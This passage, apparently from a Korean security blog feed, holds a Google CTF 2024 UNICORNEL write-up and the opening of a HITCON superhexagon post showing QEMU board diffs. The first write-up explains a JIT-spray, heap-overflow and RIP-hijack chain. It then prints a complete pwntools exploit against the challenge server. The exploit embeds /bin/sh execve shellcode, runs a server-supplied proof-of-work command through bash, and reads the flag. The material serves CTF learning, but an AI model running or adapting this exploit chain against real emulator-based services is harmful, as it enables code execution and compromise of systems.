했다. 다음과 같은 가설을 세웠다.\nJIT page가 있다는 것은 내부적인 최적화를 통해 에뮬레이션하는 코드 일부가 JIT을 통해 기계어로 변환된다는 얘기다. 이러한 JIT compile이 트리거되는 조건은 정확히 모르지만, 일반적으로 call count 같이 연속적으로 같은 코드를 실행시켜 이러한 JIT compile을 트리거할 수 있을 것이라고 생각했다. 이를 통해 유저의 입력을 JIT에 반영시킬 수 있게 만들 수 있을 것이라고 생각했고, 특정 아키텍처에서 지원하는 상수 로드를 명령을 이용해서 쉘 코드를 rwx에 일부 삽입하고 rip를 하이재킹한다면 쉘을 띄울 수 있을 것이라고 생각했다.\nx86_code = write_x86(0x3000, 0x20) x86_code += resume_x86(2) x86_code += \u0026#39;\u0026#39;\u0026#39;\\ mov rdi, 0x200 call go go: movq r10, 0xdeadbeefdeadbeef movq r10, 0xdeadbeefdeadbeef sub rdi, 1 cmp rdi, 0 je out jmp go out: ret \u0026#39;\u0026#39;\u0026#39; 위 방식으로 코드를 일부러 최적화시켰더니 일종의 dead code elimination 같은 최적화를 내부적으로 진행하는 것으로 보였다. 가장 마지막 r10에 대한 대입 코드가 기계어로 변환되었고 0xdeadbeefdeadbeef가 JIT page에 들어간 것을 확인했다. 다른 아키텍처에선 최적화가 진행되었을때 JIT page에 8바이트를 반영시킬 수 없어서 x86_64에서 최적화를 시켜야한다.\n이 시나리오를 이용하기 위해서는 다음과 같은 전제 조건이 만족되어야한다.\nJIT base를 정확하게 계산할 수 있어야한다. - 즉 JIT page를 정확하게 leak 할 수 있는 primitive가 필요하다. RIP hijacking primitive가 필요하다. JIT base leak 쓰레드 힙에서 특정 사이즈를 충족시켜 이미 free 된 메모리에서 JIT을 가리키는 청크를 reclaim 할 수 있다면 성공적인 leak primitive를 만들 수 있다. 특정 컨디션에서 성공적으로 JIT base + 0x720을 릭할 수 있었다.\nHijacking RIP 유저가 컨트롤 가능한 방식에서 추가적인 악용 가능한 포인트를 찾아야 했다. 무조건 메모리 취약점이 발생한 쓰레드 내에서의 할당이 있어야 그 객체를 타겟으로 조작을 진행할 수 있기 때문이다. 가장 매력적인 포인트는 에뮬레이팅된 시스템콜 인터페이스이다.\n시스템 콜 인터페이스 내부 unicorn engine의 구현중 uc_context_restore 에서 객체가 오염되었을 때 악용가능한 포인트를 찾을 수 있었다. context save 과정에서 동적으로 길이가 결정된다. 여기서 a1 + 384는 main heap에서 할당된 unicorn 엔진의 객체이다. 근데 여기서 a2는 보다시피 취약점이 발생한 쓰레드 힙이다.\n그렇다면 공격 면적을 좀 더 넓힐 수 있다. 단순히 쓰레드 힙의 내부 객체를 조작함으로써 메인 힙에서 오버플로우를 발생시킬 수 있고 이를 통해 메인 힙의 객체를 오염시킬 수 있게 되었다. cpu_exec_x86_64 내부에선 다음과 같이 함수 포인터를 호출하기에 특정 조건을 맞춰서 객체를 조작하면 위와 같이 RIP를 하이재킹 할 수 있었다.\nExploit code from pwn import * from keystone import * import os UC_ARCH_ARM = 1 UC_ARCH_ARM64 = 2 UC_ARCH_MIPS = 3 UC_ARCH_X86 = 4 UC_ARCH_PPC = 5 UC_ARCH_SPARC = 6 UC_ARCH_M68K = 7 UC_ARCH_RISCV = 8 UC_ARCH_S390X = 9 UC_ARCH_TRICORE = 10 UC_ARCH_MAX = 11 UC_MODE_16 = 1 \u0026lt;\u0026lt; 1 UC_MODE_32 = 1 \u0026lt;\u0026lt; 2 UC_MODE_64 = 1 \u0026lt;\u0026lt; 3 UC_MODE_ARM = 0 UC_MODE_BIG_ENDIAN = 1 \u0026lt;\u0026lt; 30 def asm_x86_64(assembly_code): ks = Ks(KS_ARCH_X86, KS_MODE_64) encoding, count = ks.asm(assembly_code) return b\u0026#39;\u0026#39;.join(bytes([b]) for b in encoding) def asm_aarch64(assembly_code): ks = Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN) encoding, count = ks.asm(assembly_code) return b\u0026#39;\u0026#39;.join(bytes([b]) for b in encoding) def asm_arm(assembly_code): ks = Ks(KS_ARCH_ARM, KS_MODE_ARM) encoding, count = ks.asm(assembly_code) return b\u0026#39;\u0026#39;.join(bytes([b]) for b in encoding) def SEND_ELF(ARCH, MODE, code_length): payload = b\u0026#39;\u0026#39; payload += p32(ARCH) payload += p32(MODE) payload += p64(0x1000) + p64(0x1000) payload += p64(0x2000) + p64(0x1000) payload += p64(0x3000) + p64(0x1000) payload += p64(0x4000) + p64(0x1000) payload += p16(code_length) payload += p8(4) payload += p8(0) * 5 p.send(payload) unicornel_exit = 0 unicornel_write = 1 print_integer = 2 create_shared = 3 map_shared = 4 unmap_shared = 5 bookmark = 6 unicornel_rewind = 7 switch_arch = 8 unicornel_pause = 9 unicornel_resume = 10 def write_x86(addr, count): payload = f\u0026#39;\u0026#39;\u0026#39;\\ mov rax, {unicornel_write} mov rbx, {addr} mov rcx, {count} int 0x80 \u0026#39;\u0026#39;\u0026#39; return payload def print_str_x86(string): payload = shellcraft.pushstr(string) + f\u0026#39;\u0026#39;\u0026#39;\\ mov rax, {unicornel_write} mov rbx, rsp mov rcx, {len(string)} int 0x80 \u0026#39;\u0026#39;\u0026#39; return payload def pause_x86(): payload = f\u0026#39;\u0026#39;\u0026#39;\\ mov rax, {unicornel_pause} int 0x80 \u0026#39;\u0026#39;\u0026#39; return payload def print_return_value_x86(): payload = f\u0026#39;\u0026#39;\u0026#39;\\ mov rbx, rax mov rax, {print_integer} int 0x80 \u0026#39;\u0026#39;\u0026#39; return payload def create_shared_x86(length): payload = f\u0026#39;\u0026#39;\u0026#39;\\ mov rax, {create_shared} mov rbx, {length} int 0x80 \u0026#39;\u0026#39;\u0026#39; return payload def map_shared_x86(address, length, handle): payload = f\u0026#39;\u0026#39;\u0026#39;\\ mov rax, {map_shared} mov rbx, {address} mov rcx, {length} mov rdx, {handle} int 0x80 \u0026#39;\u0026#39;\u0026#39; return payload def unmap_shared_x86(): payload = f\u0026#39;\u0026#39;\u0026#39;\\ mov rax, {unmap_shared} int 0x80 \u0026#39;\u0026#39;\u0026#39; return payload def resume_x86(pid): payload = f\u0026#39;\u0026#39;\u0026#39;\\ mov rbx, {pid} mov rax, {unicornel_resume} int 0x80 \u0026#39;\u0026#39;\u0026#39; return payload def rewind_x86(): payload = f\u0026#39;\u0026#39;\u0026#39; mov rax, {unicornel_rewind} int 0x80 \u0026#39;\u0026#39;\u0026#39; return payload def save_ctx_x86(): payload = f\u0026#39;\u0026#39;\u0026#39; mov rax, {bookmark} int 0x80 \u0026#39;\u0026#39;\u0026#39; return payload def pause_aarch64(): payload = f\u0026#39;\u0026#39;\u0026#39; mov x0, #{unicornel_pause} svc 0 \u0026#39;\u0026#39;\u0026#39; return payload def resume_aarch64(pid): payload = f\u0026#39;\u0026#39;\u0026#39; mov x1, #{pid} mov x0, #{unicornel_resume} svc 0 \u0026#39;\u0026#39;\u0026#39; return payload def save_ctx_aarch64(): payload = f\u0026#39;\u0026#39;\u0026#39; mov x0, #{bookmark} svc 0 \u0026#39;\u0026#39;\u0026#39; return payload def map_shared_aarch64(address, length, handle): payload = f\u0026#39;\u0026#39;\u0026#39; mov x0, #{map_shared} mov x1, #{address} mov x2, #{length} mov x3, #{handle} svc 0 \u0026#39;\u0026#39;\u0026#39; return payload def print_return_value_aarch64(): payload = f\u0026#39;\u0026#39;\u0026#39; mov x1, x0 mov x0, #{print_integer} svc 0 \u0026#39;\u0026#39;\u0026#39; return payload def rewind_aarch64(): payload = f\u0026#39;\u0026#39;\u0026#39; mov x0, #{unicornel_rewind} svc 0 \u0026#39;\u0026#39;\u0026#39; return payload def pause_arm(): payload = f\u0026#39;\u0026#39;\u0026#39; mov r0, #{unicornel_pause} svc 0 \u0026#39;\u0026#39;\u0026#39; return payload def rewind_arm(): payload = f\u0026#39;\u0026#39;\u0026#39; mov r0, #{unicornel_rewind} svc 0 \u0026#39;\u0026#39;\u0026#39; return payload def print_return_value_arm(): payload = f\u0026#39;\u0026#39;\u0026#39; mov r1, r0 mov r0, {print_integer} svc 0 \u0026#39;\u0026#39;\u0026#39; return payload def save_ctx_arm(): payload = f\u0026#39;\u0026#39;\u0026#39; mov r0, #{bookmark} svc 0 \u0026#39;\u0026#39;\u0026#39; return payload def resume_arm(pid): payload = f\u0026#39;\u0026#39;\u0026#39; mov r0, #{unicornel_resume} mov r1, #{pid} svc 0 \u0026#39;\u0026#39;\u0026#39; return payload def map_shared_arm(address, length, handle): payload = f\u0026#39;\u0026#39;\u0026#39; mov r0, #{map_shared} mov r1, #{address} mov r2, #{length} mov r3, #{handle} svc 0 \u0026#39;\u0026#39;\u0026#39; return payload while True: REMOTE = True if REMOTE: p = remote(\u0026#39;unicornel.2024.ctfcompetition.com\u0026#39;, 1337) p.recvuntil(b\u0026#39;You can run the solver with:\\n\u0026#39;) cmd = \u0026#34;bash -c \u0026#39;\u0026#34; + (p.recvline()[4:]).decode() + \u0026#34;\u0026#39;\u0026#34; result = (os.popen(cmd).read()) p.sendline(result.split ()[0]) log.success(\u0026#34;POW finished\u0026#34;) else: p = process(\u0026#39;./chal\u0026#39;) context.binary = ELF(\u0026#39;./chal\u0026#39;) # pid 0 code = \u0026#39;\u0026#39; code += \u0026#39;mov sp, #0x2000\\n\u0026#39; code += save_ctx_aarch64() code += pause_aarch64() code += map_shared_aarch64(0x5000, 0x5000, 0) code += resume_aarch64(1) code += rewind_aarch64() payload = asm_aarch64(code) SEND_ELF(UC_ARCH_ARM64, UC_MODE_ARM, len(payload)) p.send(payload) p.recvuntil(b\u0026#39;with pid \u0026#39;) pid = int(p.recvline()[:-1]) log.success(f\u0026#34;created process - {pid}\u0026#34;) # pid 1 code = \u0026#39;\u0026#39; code += \u0026#39;mov rsp, 0x2000\\n\u0026#39; code += \u0026#39;retry:\\n\u0026#39; code += create_shared_x86(0x000000000005000) code += resume_x86(0) code += pause_x86() code += map_shared_x86(0x5000, 0x5000, 0) # handle 0 code += \u0026#39;\u0026#39;\u0026#39;\\ mov rdi, 0x5000 mov rax, [rdi] cmp rax, 0 jne success \u0026#39;\u0026#39;\u0026#39; code += unmap_shared_x86() code += \u0026#39;jmp retry\\n\u0026#39; code += \u0026#39;success:\\n\u0026#39; code += write_x86(0x5000, 0x40) code += write_x86(0x5000, 0x10) code += pause_x86() # exploit phase 2 aaw code += \u0026#39;jmp 0x7000\\n\u0026#39; # shared memory - shellcode start # maybe RVA? 0x7000 not working payload = asm_x86_64(code) SEND_ELF(UC_ARCH_X86, UC_MODE_64, len(payload)) p.send(payload) p.recvuntil(b\u0026#39;with pid \u0026#39;) pid = int(p.recvline()[:-1]) log.success(f\u0026#34;created process - {pid}\u0026#34;) rv = p.recv(0x40) leak = u64(rv[:8]) thread_heap = u64(rv[16:24]) log.success(\u0026#34;thread heap: \u0026#34; + hex(thread_heap)) JIT = leak - 0x720 heap_leak = u64(rv[0x10:0x18]) + 0x1e820 if JIT \u0026lt; 0: continue log.success(\u0026#34;JIT: \u0026#34;+hex(JIT)) log.success(\u0026#34;heap target: \u0026#34;+hex(heap_leak)) rv = p.recv(0x10) leak = u64(rv[:8]) if leak-0x720 != JIT: # leak + 0x720 continue # pid 2 x86_code = write_x86(0x3000, 0x20) # shellcode = [] # shellcode.append(u64(asm(\u0026#39;\u0026#39;\u0026#39;\\ # push 0x68732f # pop rax # jmp $+0x8 # \u0026#39;\u0026#39;\u0026#39;).ljust(8,b\u0026#39;\\x00\u0026#39;))) # shellcode.append(u64(asm(\u0026#39;\u0026#39;\u0026#39;\\ # push 0x6e69622f # pop rdx # jmp $+0x8 # \u0026#39;\u0026#39;\u0026#39;).ljust(8,b\u0026#39;\\x00\u0026#39;))) # shellcode.append(u64(asm(\u0026#39;\u0026#39;\u0026#39;\\ # shl rax,0x20 # xor esi,esi # jmp $+0x8 # \u0026#39;\u0026#39;\u0026#39;).ljust(8,b\u0026#39;\\x00\u0026#39;))) # shellcode.append(u64(asm(\u0026#39;\u0026#39;\u0026#39;\\ # add rax,rdx # xor edx,edx # push rax # jmp $+0x8 # \u0026#39;\u0026#39;\u0026#39;).ljust(8,b\u0026#39;\\x00\u0026#39;))) # shellcode.append(u64(asm(\u0026#39;\u0026#39;\u0026#39;\\ # mov rdi,rsp # push 0x3b # pop rax # syscall # \u0026#39;\u0026#39;\u0026#39;).ljust(8,b\u0026#39;\\x00\u0026#39;))) shellcode = [498588942530195304, 498591614015516520, 498762874620002632, 498581047463641416, 364607107060173128] print(shellcode) x86_code += f\u0026#39;\u0026#39;\u0026#39;\\ movq r9, 0xcafebabecafebabe movq r10, {hex(shellcode[0])} movq r11, {hex(shellcode[1])} movq r12, {hex(shellcode[2])} movq r13, {hex(shellcode[3])} movq r14, {hex(shellcode[4])} \u0026#39;\u0026#39;\u0026#39; x86_code += save_ctx_x86() x86_code += resume_x86(2) # go x86_code += pause_x86() x86_code += rewind_x86() x86_payload = asm_x86_64(x86_code) x86_payload = x86_payload.ljust((len(x86_code)//4 + 1)*4, b\u0026#39;\\x00\u0026#39;) stub = \u0026#39;mov r0, 0x8000\\n\u0026#39; for i in range(len(x86_code)//4): stub += f\u0026#39;ldr r1, = {u32(x86_payload[4*i:4*i+4])}\\n\u0026#39; stub += f\u0026#39;str r1, [r0]\\n\u0026#39; stub += f\u0026#39;add r0, r0, #4\\n\u0026#39; code = \u0026#39;\u0026#39; code += \u0026#39;mov sp, #0x2000\\n\u0026#39; code += map_shared_arm(0x5000, 0x5000, 0) code += print_return_value_arm() code += stub code += resume_arm(1) code += pause_arm() # go target target = heap_leak - 0x2c0 + 0x8 target1 = heap_leak - 0x90 + 0x10 jump = JIT + 0xddb code += f\u0026#39;\u0026#39;\u0026#39;\\ ldr r1, = {0x3000} ldr r0, = {0x5190} str r1, [r0] // size overwrite ldr r0, = {0x51a0 + 8} ldr r1, = {target1 \u0026amp; 0xffffffff} ldr r2, = {target1 \u0026gt;\u0026gt; 32} str r1, [r0] add r0, r0, #4 str r2, [r0] ldr r0, = {0x51a0 + 0x10} ldr r1, = {jump \u0026amp; 0xffffffff} ldr r2, = {jump \u0026gt;\u0026gt; 32} str r1, [r0] add r0, r0, #4 str r2, [r0] ldr r0, = {0x51a0 + 0x1b38} ldr r1, = {target \u0026amp; 0xffffffff} ldr r2, = {target \u0026gt;\u0026gt; 32} str r1, [r0] add r0, r0, #4 str r2, [r0] \u0026#39;\u0026#39;\u0026#39; code += resume_arm(1) \u0026#39;\u0026#39;\u0026#39; 0x559c69a119a8 4c89ef \u0026lt;cpu_exec_x86_64+0x288\u0026gt; mov rdi, r13 -\u0026gt; 0x559c69a119ab 488b80c0020000 \u0026lt;cpu_exec_x86_64+0x28b\u0026gt; mov rax, QWORD PTR [rax + 0x2c0] 0x559c69a119b2 ff9090000000 \u0026lt;cpu_exec_x86_64+0x292\u0026gt; call QWORD PTR [rax + 0x90] 0x559c69a119b8 4989c4 \u0026lt;cpu_exec_x86_64+0x298\u0026gt; mov r12, rax 0x559c69a119bb 488b83a8810000 \u0026lt;cpu_exec_x86_64+0x29b\u0026gt; mov rax, QWORD PTR [rbx + 0x81a8] 0x559c69a119c2 4d89e7 \u0026lt;cpu_exec_x86_64+0x2a2\u0026gt; mov r15, r12 \u0026#39;\u0026#39;\u0026#39; payload = asm_arm(code) SEND_ELF(UC_ARCH_ARM, UC_MODE_ARM, len(payload)) pause() p.send(payload) try: p.recvuntil(b\u0026#39;with pid \u0026#39;) pid = int(p.recvline()[:-1]) log.success(f\u0026#34;created process - {pid}\u0026#34;) sleep(1) p.sendline(b\u0026#39;id\u0026#39;) p.sendline(b\u0026#39;id\u0026#39;) p.sendline(b\u0026#39;cat flag*\u0026#39;) if b\u0026#39;uid\u0026#39; in p.recvuntil(b\u0026#39;uid\u0026#39;, timeout=2): p.interactive() break except Exception as e: print(e) pass it += 1 p.close() ","permalink":"https://msh1307.kr/blog/google_ctf_2024_unicornel/","summary":"UNICORNEL Cold Fusion 연합팀으로 Google ctf에 참여했다. 늦잠자서 늦게 합류했는데, 이미 팀원분이 취약점을 찾아놓으셔서 어떻게 악용할지를 중점적으로 생각하고 익스플로잇을 작성해서 챌린지를 해결했다.\nAnalysis ==== About ==== Unicornel is a multi-process, multi-architecture emulator server with concurrency and system call support. All processes of any architecture share the underlying kernel, and can interact with each other via system calls and in particular a lightweight shared memory interface. ==== Starting processes ==== In order to start a new process, you must first send a unicornelf header, which naturally bears no resemblance whatsoever to the actual ELF standard: struct unicornelf { uc_arch arch; //Desired unicorn-supported ISA uc_mode mode; //Desired unicorn-supported mode struct { unsigned long va; //Virtual address to map unsigned long length; //Length of memory to map } maps[4]; //Up to 4 mappings supported unsigned short code_length; //The length of the code to follow the unicornelf header unsigned char num_maps; //The number of mappings initialized in the maps array }; Following the unicornelf header should be \u0026lt;code length\u0026gt; bytes of assembled machine code in the specified instruction set architecture.","title":"Google CTF 2024 - UNICORNEL"},{"content":"오랜만에 한꺼번에 블로그 글을 쓰게 되었다. 이번년도 초에 Theori에서 과제로 superhexagon을 풀면서 관련 CS를 한달간 공부해오는 것을 과제로 받았다. 글에서 언급하는 background 내용은 다른 글에서 따로 정리되어있다.\nOverview diff -Naur \u0026#39;--exclude=tests\u0026#39; \u0026#39;--exclude=roms\u0026#39; \u0026#39;--exclude=capstone\u0026#39; \u0026#39;--exclude=docs\u0026#39; ../temp/qemu-3.0.0/hw/arm/hitcon.c qemu/hw/arm/hitcon.c --- ../temp/qemu-3.0.0/hw/arm/hitcon.c\t1969-12-31 16:00:00.000000000 -0800 +++ qemu/hw/arm/hitcon.c\t2018-10-19 10:49:59.412023642 -0700 @@ -0,0 +1,208 @@ +#include \u0026#34;qemu/osdep.h\u0026#34; +#include \u0026#34;qapi/error.h\u0026#34; +#include \u0026#34;qemu-common.h\u0026#34; +#include \u0026#34;cpu.h\u0026#34; +#include \u0026#34;hw/sysbus.h\u0026#34; +#include \u0026#34;hw/devices.h\u0026#34; +#include \u0026#34;hw/boards.h\u0026#34; +#include \u0026#34;hw/arm/arm.h\u0026#34; +#include \u0026#34;hw/misc/arm_integrator_debug.h\u0026#34; +#include \u0026#34;net/net.h\u0026#34; +#include \u0026#34;exec/address-spaces.h\u0026#34; +#include \u0026#34;sysemu/sysemu.h\u0026#34; +#include \u0026#34;qemu/error-report.h\u0026#34; +#include \u0026#34;hw/char/pl011.h\u0026#34; +#include \u0026#34;hw/loader.h\u0026#34; +#include \u0026#34;hw/intc/arm_gic_common.h\u0026#34; + +typedef struct MemMapEntry { + hwaddr base; + hwaddr size; +} MemMapEntry; + +enum { + VIRT_FLASH, + VIRT_CPUPERIPHS, + VIRT_MEM, + VIRT_SECURE_MEM, + VIRT_UART, +}; + +#define RAMLIMIT_GB 3 +#define RAMLIMIT_BYTES (RAMLIMIT_GB * 1024ULL * 1024 * 1024) +static const MemMapEntry memmap[] = { + /* Space up to 0x8000000 is reserved for a boot ROM */ + [VIRT_FLASH] = { 0, 0x08000000 }, + [VIRT_CPUPERIPHS] = { 0x08000000, 0x00020000 }, + [VIRT_UART] = { 0x09000000, 0x00001000 }, + [VIRT_SECURE_MEM] = { 0x0e000000, 0x01000000 }, + [VIRT_MEM] = { 0x40000000, RAMLIMIT_BYTES }, +}; + +static const char *valid_cpus[] = { + ARM_CPU_TYPE_NAME(\u0026#34;hitcon\u0026#34;), +}; + +static bool cpu_type_valid(const char *cpu) +{ + int i; + for (i = 0; i \u0026lt; ARRAY_SIZE(valid_cpus); i++) { + if (strcmp(cpu, valid_cpus[i]) == 0) { + return true; + } + } + return false; +} + +static void create_one_flash(const char *name, hwaddr flashbase, + hwaddr flashsize, const char *file, + MemoryRegion *sysmem) +{ + /* Create and map a single flash device. We use the same + * parameters as the flash devices on the Versatile Express board. + */ + DriveInfo *dinfo = drive_get_next(IF_PFLASH); + DeviceState *dev = qdev_create(NULL, \u0026#34;cfi.pflash01\u0026#34;); + SysBusDevice *sbd = SYS_BUS_DEVICE(dev); + const uint64_t sectorlength = 256 * 1024; + + if (dinfo) { + qdev_prop_set_drive(dev, \u0026#34;drive\u0026#34;, blk_by_legacy_dinfo(dinfo), + \u0026amp;error_abort); + } + + qdev_prop_set_uint32(dev, \u0026#34;num-blocks\u0026#34;, flashsize / sectorlength); + qdev_prop_set_uint64(dev, \u0026#34;sector-length\u0026#34;, sectorlength); + qdev_prop_set_uint8(dev, \u0026#34;width\u0026#34;, 4); + qdev_prop_set_uint8(dev, \u0026#34;device-width\u0026#34;, 2); + qdev_prop_set_bit(dev, \u0026#34;big-endian\u0026#34;, false); + qdev_prop_set_uint16(dev, \u0026#34;id0\u0026#34;, 0x89); + qdev_prop_set_uint16(dev, \u0026#34;id1\u0026#34;, 0x18); + qdev_prop_set_uint16(dev, \u0026#34;id2\u0026#34;, 0x00); + qdev_prop_set_uint16(dev, \u0026#34;id3\u0026#34;, 0x00); + qdev_prop_set_string(dev, \u0026#34;name\u0026#34;, name); + qdev_init_nofail(dev); + + memory_region_add_subregion(sysmem, flashbase, + sysbus_mmio_get_region(SYS_BUS_DEVICE(dev), 0)); + + if (file) { + char *fn; + int image_size; + + if (drive_get(IF_PFLASH, 0, 0)) { + error_report(\u0026#34;The contents of the first flash device may be \u0026#34; + \u0026#34;specified with -bios or with -drive if=pflash... \u0026#34; + \u0026#34;but you cannot use both options at once\u0026#34;); + exit(1); + } + fn = qemu_find_file(QEMU_FILE_TYPE_BIOS, file); + if (!fn) { + error_report(\u0026#34;Could not find ROM image \u0026#39;%s\u0026#39;\u0026#34;, file); + exit(1); + } + image_size = load_image_mr(fn, sysbus_mmio_get_region(sbd, 0)); + g_free(fn); + if (image_size \u0026lt; 0) { + error_report(\u0026#34;Could not load ROM image \u0026#39;%s\u0026#39;\u0026#34;, file); + exit(1); + } + } +} + +static void create_uart(int uart, MemoryRegion *mem, Chardev *chr) +{ + hwaddr base = memmap[uart].base; + DeviceState *dev = qdev_create(NULL, \u0026#34;pl011\u0026#34;); + SysBusDevice *s = SYS_BUS_DEVICE(dev); + qdev_prop_set_chr(dev, \u0026#34;chardev\u0026#34;, chr); + qdev_init_nofail(dev); + memory_region_add_subregion(mem, base, sysbus_mmio_get_region(s, 0)); +} + +static struct arm_boot_info bootinfo; + +static void hitcon_init(MachineState *machine) +{ + MemoryRegion *sysmem = get_system_memory(); + MemoryRegion *secure_sysmem = NULL; + + if (!cpu_type_valid(machine-\u0026gt;cpu_type)) { + error_report(\u0026#34;mach-hitcon: CPU type %s not supported\u0026#34;, machine-\u0026gt;cpu_type); + exit(1); + } + + if (machine-\u0026gt;ram_size != memmap[VIRT_MEM].size) { + error_report(\u0026#34;mach-virt: NS RAM must be %dGB\u0026#34;, RAMLIMIT_GB); + exit(1); + } + + if(!bios_name) { + error_report(\u0026#34;mach-hitcon: BIOS bin does not exist\u0026#34;); + exit(1); + } + + // prepare secure memory + secure_sysmem = g_new(MemoryRegion, 1); + memory_region_init(secure_sysmem, OBJECT(machine), \u0026#34;secure-memory\u0026#34;, UINT64_MAX); + memory_region_add_subregion_overlap(secure_sysmem, 0, sysmem, -1); + + // prepare cpu + Object *cpuobj = object_new(ARM_CPU_TYPE_NAME(\u0026#34;hitcon\u0026#34;)); + object_property_set_int(cpuobj, (0x9 \u0026lt;\u0026lt; 8), \u0026#34;mp-affinity\u0026#34;, NULL); + object_property_set_bool(cpuobj, true, \u0026#34;has_el3\u0026#34;, NULL); + object_property_set_bool(cpuobj, true, \u0026#34;has_el2\u0026#34;, NULL); + object_property_set_bool(cpuobj, false, \u0026#34;pmu\u0026#34;, NULL); + object_property_find(cpuobj, \u0026#34;reset-cbar\u0026#34;, NULL); + object_property_set_int(cpuobj, memmap[VIRT_CPUPERIPHS].base, \u0026#34;reset-cbar\u0026#34;, \u0026amp;error_abort); + object_property_set_link(cpuobj, OBJECT(sysmem), \u0026#34;memory\u0026#34;, \u0026amp;error_abort); + object_property_set_link(cpuobj, OBJECT(secure_sysmem), \u0026#34;secure-memory\u0026#34;, \u0026amp;error_abort); + object_property_set_bool(cpuobj, true, \u0026#34;realized\u0026#34;, \u0026amp;error_fatal); + object_unref(cpuobj); + + // prepare ram / rom + MemoryRegion *ram = g_new(MemoryRegion, 1); + memory_region_allocate_system_memory(ram, NULL, \u0026#34;mach-hitcon.ram\u0026#34;, machine-\u0026gt;ram_size); + memory_region_add_subregion(sysmem, memmap[VIRT_MEM].base, ram); + + hwaddr flashsize = memmap[VIRT_FLASH].size / 2; + hwaddr flashbase = memmap[VIRT_FLASH].base; + create_one_flash(\u0026#34;hitcon.flash0\u0026#34;, flashbase, flashsize, bios_name, secure_sysmem); + create_one_flash(\u0026#34;hitcon.flash1\u0026#34;, flashbase + flashsize, flashsize, NULL, sysmem); + + MemoryRegion *secram = g_new(MemoryRegion, 1); + hwaddr base = memmap[VIRT_SECURE_MEM].base; + hwaddr size = memmap[VIRT_SECURE_MEM].size; + memory_region_init_ram(secram, NULL, \u0026#34;hitcon.secure-ram\u0026#34;, size, \u0026amp;error_fatal); + memory_region_add_subregion(secure_sysmem, base, secram); + + // GIC \u0026amp; UART + create_uart(VIRT_UART, sysmem, serial_hd(0)); + + + // prepare boot info + bootinfo.ram_size = machine-\u0026gt;ram_size; + bootinfo.nb_cpus = 1; + bootinfo.board_id = -1; + bootinfo.firmware_loaded = true; + bootinfo.loader_start = memmap[VIRT_MEM].base; + bootinfo.kernel_filename = machine-\u0026gt;kernel_filename; + bootinfo.kernel_cmdline = machine-\u0026gt;kernel_cmdline; + bootinfo.initrd_filename = machine-\u0026gt;initrd_filename; + bootinfo.skip_dtb_autoload = true; + arm_load_kernel(ARM_CPU(first_cpu), \u0026amp;bootinfo); +} + +static void hitcon_machine_init(MachineClass *mc) +{ + mc-\u0026gt;desc = \u0026#34;HITCON CTF Virtual Machine\u0026#34;; + mc-\u0026gt;init = hitcon_init; + mc-\u0026gt;max_cpus = 1; + mc-\u0026gt;min_cpus = 1; + mc-\u0026gt;default_cpus = 1; + mc-\u0026gt;default_ram_size = RAMLIMIT_BYTES; + mc-\u0026gt;ignore_memory_transaction_failures = true; + mc-\u0026gt;default_cpu_type = ARM_CPU_TYPE_NAME(\u0026#34;hitcon\u0026#34;); +} + +DEFINE_MACHINE(\u0026#34;hitcon\u0026#34;, hitcon_machine_init) DEFINE_MACHINE으로 hitcon machine을 정의한다. 여기서 메모리 계층이 약간 신기하게 되어있다. qemu 메모리는 기본적으로 메모리 계층? 처럼 region과 그에 대한 subregion으로 구성된다. 이러한 region들은 각자의 priority를 가지며 낮은 priority 일수록 참조가 우선된다.\n+#define RAMLIMIT_GB 3 +#define RAMLIMIT_BYTES (RAMLIMIT_GB * 1024ULL * 1024 * 1024) +static const MemMapEntry memmap[] = { + /* Space up to 0x8000000 is reserved for a boot ROM */ + [VIRT_FLASH] = { 0, 0x08000000 }, + [VIRT_CPUPERIPHS] = { 0x08000000, 0x00020000 }, + [VIRT_UART] = { 0x09000000, 0x00001000 }, + [VIRT_SECURE_MEM] = { 0x0e000000, 0x01000000 }, + [VIRT_MEM] = { 0x40000000, RAMLIMIT_BYTES }, +}; 위와 같은 물리 메모리 맵을 가지게 된다\ndiff -Naur \u0026#39;--exclude=tests\u0026#39; \u0026#39;--exclude=roms\u0026#39; \u0026#39;--exclude=capstone\u0026#39; \u0026#39;--exclude=docs\u0026#39; ../temp/qemu-3.0.0/hw/arm/Makefile.objs qemu/hw/arm/Makefile.objs --- ../temp/qemu-3.0.0/hw/arm/Makefile.objs\t2018-08-14 12:10:34.000000000 -0700 +++ qemu/hw/arm/Makefile.objs\t2018-09-11 00:59:23.915929581 -0700 @@ -1,4 +1,4 @@ -obj-y += boot.o virt.o sysbus-fdt.o +obj-y += boot.o virt.o sysbus-fdt.o hitcon.o obj-$(CONFIG_ACPI) += virt-acpi-build.o obj-$(CONFIG_DIGIC) += digic_boards.o obj-$(CONFIG_EXYNOS4) += exynos4_boards.o diff -Naur \u0026#39;--exclude=tests\u0026#39; \u0026#39;--exclude=roms\u0026#39; \u0026#39;--exclude=capstone\u0026#39; \u0026#39;--exclude=docs\u0026#39; ../temp/qemu-3.0.0/hw/char/pl011.c qemu/hw/char/pl011.c --- ../temp/qemu-3.0.0/hw/char/pl011.c\t2018-08-14 12:10:34.000000000 -0700 +++ qemu/hw/char/pl011.c\t2018-10-19 16:34:07.692477202 -0700 @@ -94,6 +94,7 @@ r = s-\u0026gt;rsr; break; case 6: /* UARTFR */ + usleep(10); r = s-\u0026gt;flags; break; case 8: /* UARTILPR */ diff -Naur \u0026#39;--exclude=tests\u0026#39; \u0026#39;--exclude=roms\u0026#39; \u0026#39;--exclude=capstone\u0026#39; \u0026#39;--exclude=docs\u0026#39; ../temp/qemu-3.0.0/target/arm/cpu64.c qemu/target/arm/cpu64.c --- ../temp/qemu-3.0.0/target/arm/cpu64.c\t2018-08-14 12:10:35.000000000 -0700 +++ qemu/target/arm/cpu64.c\t2018-10-19 16:26:20.955912362 -0700 @@ -256,6 +256,127 @@ } } +#define FLAG \u0026#34;/home/super_hexagon/flag/\u0026#34; + +static uint64_t hitcon_flag_word_idx_read(CPUARMState *env, + const ARMCPRegInfo *ri, int idx) +{ + int el = arm_current_el(env); + bool is_secure = arm_is_secure(env); + assert(el \u0026gt;= 0 \u0026amp;\u0026amp; el \u0026lt;= 3); + const char *flag_name; + if (el == 3) { + flag_name = FLAG\u0026#34;6\u0026#34;; + } else if (el == 2) { + flag_name = FLAG\u0026#34;3\u0026#34;; + } else if (el == 1) { + if (is_secure) { + flag_name = FLAG\u0026#34;5\u0026#34;; + } else { + flag_name = FLAG\u0026#34;2\u0026#34;; + } + } else { + if (is_secure) { + flag_name = FLAG\u0026#34;4\u0026#34;; + } else { + flag_name = FLAG\u0026#34;1\u0026#34;; + } + } + int fd = 